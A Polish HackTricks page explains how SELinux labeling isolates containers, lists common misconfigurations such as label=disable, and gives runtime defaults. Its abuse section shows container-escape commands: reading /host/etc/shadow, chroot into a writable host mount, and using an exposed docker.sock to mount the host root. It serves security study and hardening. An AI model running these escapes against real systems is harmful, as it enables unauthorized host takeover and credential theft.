# SELinux

{{#include ../../../../banners/hacktricks-training.md}}

## AppArmor Vs SELinux

Najłatwiejsza różnica na wysokim poziomie polega na tym, że AppArmor jest oparty na ścieżkach, podczas gdy SELinux jest **oparty na etykietach**. Ma to duże konsekwencje dla bezpieczeństwa kontenerów. Policy oparta na ścieżkach może działać inaczej, jeśli ta sama zawartość hosta stanie się widoczna pod nieoczekiwaną ścieżką montowania. Policy oparta na etykietach sprawdza natomiast, jaką etykietę ma obiekt oraz co domena procesu może z nim zrobić. Nie sprawia to, że SELinux jest prosty, ale zapewnia odporność na klasę założeń dotyczących manipulowania ścieżkami, które obrońcy czasami przypadkowo przyjmują w systemach opartych na AppArmor.

Ponieważ model jest zorientowany na etykiety, obsługa wolumenów kontenerów i decyzje dotyczące ponownego etykietowania mają krytyczne znaczenie dla bezpieczeństwa. Jeśli runtime lub operator zmieni etykiety zbyt szeroko, aby „montowania działały”, granica policy, która miała izolować workload, może stać się znacznie słabsza, niż zamierzano.

## Laboratorium

Aby sprawdzić, czy SELinux jest aktywny na hoście:
```bash
getenforce 2>/dev/null
sestatus 2>/dev/null
```
Aby sprawdzić istniejące etykiety na hoście:
```bash
ps -eZ | head
ls -Zd /var/lib/containers 2>/dev/null
ls -Zd /var/lib/docker 2>/dev/null
```
Aby porównać normalne uruchomienie z takim, w którym etykietowanie jest wyłączone:
```bash
podman run --rm fedora cat /proc/self/attr/current
podman run --rm --security-opt label=disable fedora cat /proc/self/attr/current
```
Na hoście z włączonym SELinux jest to bardzo praktyczna demonstracja, ponieważ pokazuje różnicę między workloadem działającym w oczekiwanej domenie kontenera a takim, który został pozbawiony tej warstwy egzekwowania zasad.

## Zastosowanie w runtime

Podman jest szczególnie dobrze dostosowany do SELinux w systemach, w których SELinux jest częścią domyślnej platformy. Rootless Podman w połączeniu z SELinux to jedna z najsilniejszych mainstreamowych baz bezpieczeństwa kontenerów, ponieważ proces jest już nieuprzywilejowany po stronie hosta, a jednocześnie nadal ograniczany przez politykę MAC. Docker również może używać SELinux, jeśli jest obsługiwany, chociaż administratorzy czasami go wyłączają, aby obejść problemy z etykietowaniem wolumenów. CRI-O i OpenShift w dużym stopniu opierają swoją izolację kontenerów na SELinux. Kubernetes również może udostępniać ustawienia związane z SELinux, ale ich wartość oczywiście zależy od tego, czy system operacyjny węzła faktycznie obsługuje i egzekwuje SELinux.<sup>[[2]](#references)</sup>

Powtarzająca się lekcja jest taka, że SELinux nie jest opcjonalnym dodatkiem. W ekosystemach zbudowanych wokół niego stanowi część oczekiwanej granicy bezpieczeństwa.

## Błędne konfiguracje

Klasycznym błędem jest `label=disable`. W praktyce często dzieje się tak, ponieważ montowanie wolumenu zostało zablokowane, a najszybszym krótkoterminowym rozwiązaniem było usunięcie SELinux z równania zamiast naprawienia modelu etykietowania.<sup>[[1]](#references)</sup> Innym częstym błędem jest nieprawidłowe ponowne etykietowanie zawartości hosta. Szeroko zakrojone operacje ponownego etykietowania mogą sprawić, że aplikacja zacznie działać, ale mogą również znacznie rozszerzyć zakres zasobów, do których kontener może uzyskać dostęp, poza pierwotnie zamierzony zakres.

Ważne jest również, aby nie mylić **zainstalowanego** SELinux z **aktywnie egzekwowanym** SELinux. Host może obsługiwać SELinux i nadal działać w trybie permissive, albo runtime może uruchamiać workload w innej niż oczekiwana domenie. W takich przypadkach ochrona jest znacznie słabsza, niż mogłaby sugerować dokumentacja.

## Nadużycia

Gdy SELinux jest nieobecny, działa w trybie permissive lub został szeroko wyłączony dla workloadu, ścieżki montowane z hosta stają się znacznie łatwiejsze do abuse. Ten sam bind mount, który w przeciwnym razie byłby ograniczany przez etykiety, może stać się bezpośrednią drogą do danych hosta lub do jego modyfikacji. Jest to szczególnie istotne w połączeniu z zapisywalnymi mountami wolumenów, katalogami runtime kontenerów lub operacyjnymi skrótami, które dla wygody udostępniają wrażliwe ścieżki hosta.

SELinux często wyjaśnia, dlaczego ogólny writeup dotyczący breakout działa natychmiast na jednym hoście, ale wielokrotnie kończy się niepowodzeniem na innym, mimo że flagi runtime wyglądają podobnie. Brakującym elementem często nie jest wcale namespace ani capability, lecz granica etykiet, która pozostała nienaruszona.

Najszybszym praktycznym sprawdzeniem jest porównanie aktywnego kontekstu, a następnie zbadanie zamontowanych ścieżek hosta lub katalogów runtime, które normalnie byłyby ograniczone przez etykiety:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
find / -maxdepth 3 -name '*.sock' 2>/dev/null | grep -E 'docker|containerd|crio'
find /host -maxdepth 2 -ls 2>/dev/null | head
```
Jeśli obecny jest host bind mount, a etykietowanie SELinux zostało wyłączone lub osłabione, często najpierw dochodzi do ujawnienia informacji:
```bash
ls -la /host/etc 2>/dev/null | head
cat /host/etc/passwd 2>/dev/null | head
cat /host/etc/shadow 2>/dev/null | head
```
Jeśli mount jest zapisywalny, a kontener z punktu widzenia kernela ma faktycznie uprawnienia host-root, następnym krokiem jest przetestowanie kontrolowanej modyfikacji hosta zamiast zgadywania:
```bash
touch /host/tmp/selinux_test 2>/dev/null && echo "host write works"
ls -l /host/tmp/selinux_test 2>/dev/null
```
Na hostach obsługujących SELinux utrata etykiet wokół katalogów stanu środowiska wykonawczego może również ujawnić bezpośrednie ścieżki eskalacji uprawnień:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host/var/lib -maxdepth 3 \( -name docker -o -name containers -o -name containerd \) 2>/dev/null
```
Te polecenia nie zastępują pełnego łańcucha escape, ale bardzo szybko pokazują, czy to SELinux uniemożliwiał dostęp do danych hosta lub modyfikację plików po stronie hosta.

### Pełny przykład: SELinux wyłączony + zapisywalny mount hosta

Jeśli etykietowanie SELinux jest wyłączone, a system plików hosta jest zamontowany z prawem zapisu w `/host`, pełny host escape staje się zwykłym przypadkiem nadużycia bind-mount:
```bash
getenforce 2>/dev/null
cat /proc/self/attr/current
touch /host/tmp/selinux_escape_test
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Jeśli `chroot` zakończy się powodzeniem, proces kontenera działa teraz z systemu plików hosta:
```bash
id
hostname
cat /etc/passwd | tail
```
### Pełny przykład: SELinux wyłączony + katalog runtime

Jeśli workload może uzyskać dostęp do socketu runtime po wyłączeniu labels, escape można zlecić runtime:
```bash
find /host/var/run /host/run -maxdepth 2 -name '*.sock' 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
```
Istotna obserwacja jest taka, że SELinux często stanowił mechanizm kontroli uniemożliwiający dokładnie tego rodzaju dostęp do ścieżek hosta lub stanu runtime.

## Kontrole

Celem kontroli SELinux jest potwierdzenie, że SELinux jest włączony, zidentyfikowanie bieżącego kontekstu bezpieczeństwa oraz sprawdzenie, czy pliki lub ścieżki, które Cię interesują, są faktycznie ograniczone za pomocą etykiet.
```bash
getenforce                              # Enforcing / Permissive / Disabled
ps -eZ | grep -i container              # Process labels for container-related processes
ls -Z /path/of/interest                 # File or directory labels on sensitive paths
cat /proc/self/attr/current             # Current process security context
```
Co jest tutaj istotne:

- `getenforce` powinno idealnie zwracać `Enforcing`; `Permissive` lub `Disabled` zmienia znaczenie całej sekcji SELinux.
- Jeśli kontekst bieżącego procesu wygląda nieoczekiwanie lub jest zbyt szeroki, workload może nie działać zgodnie z zamierzoną polityką kontenera.
- Jeśli pliki montowane z hosta lub katalogi runtime mają etykiety, do których proces ma zbyt swobodny dostęp, bind mounts stają się znacznie bardziej niebezpieczne.

Podczas analizy kontenera na platformie obsługującej SELinux nie należy traktować etykietowania jako drugorzędnego szczegółu. W wielu przypadkach jest ono jednym z głównych powodów, dla których host nie został jeszcze skompromitowany.

## Domyślne ustawienia runtime

| Runtime / platforma | Stan domyślny | Domyślne działanie | Częste ręczne osłabienia |
| --- | --- | --- | --- |
| Docker Engine | Zależny od hosta | Separacja SELinux jest dostępna na hostach z włączonym SELinux, ale dokładne działanie zależy od konfiguracji hosta/daemon | `--security-opt label=disable`, szerokie relabelowanie bind mounts, `--privileged` |
| Podman | Zwykle włączony na hostach SELinux | Separacja SELinux jest standardowym elementem Podman na systemach SELinux, chyba że zostanie wyłączona | `--security-opt label=disable`, `label=false` w `containers.conf`, `--privileged` |
| Kubernetes | Zwykle nie jest automatycznie przypisywany na poziomie Pod | Obsługa SELinux istnieje, ale Pods zwykle wymagają `securityContext.seLinuxOptions` lub domyślnych ustawień zależnych od platformy; wymagana jest obsługa przez runtime i node | słabe lub zbyt szerokie `seLinuxOptions`, działanie na node’ach w trybie permissive/disabled, polityki platformy wyłączające etykietowanie |
| CRI-O / wdrożenia w stylu OpenShift | Zwykle intensywnie wykorzystywany | SELinux jest często podstawowym elementem modelu izolacji node’a w tych środowiskach | niestandardowe polityki nadmiernie rozszerzające dostęp, wyłączanie etykietowania w celu zapewnienia kompatybilności |

Domyślne ustawienia SELinux zależą bardziej od dystrybucji niż domyślne ustawienia seccomp. W systemach w stylu Fedora/RHEL/OpenShift SELinux często stanowi centralny element modelu izolacji. Na systemach bez SELinux jest po prostu nieobecny.

## References

- [1] [Podman Documentation: --security-opt=option (label=disable)](https://docs.podman.io/en/v4.6.0/markdown/options/security-opt.html)
- [2] [Kubernetes: Configure a Security Context for a Pod or Container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/)

{{#include ../../../../banners/hacktricks-training.md}}
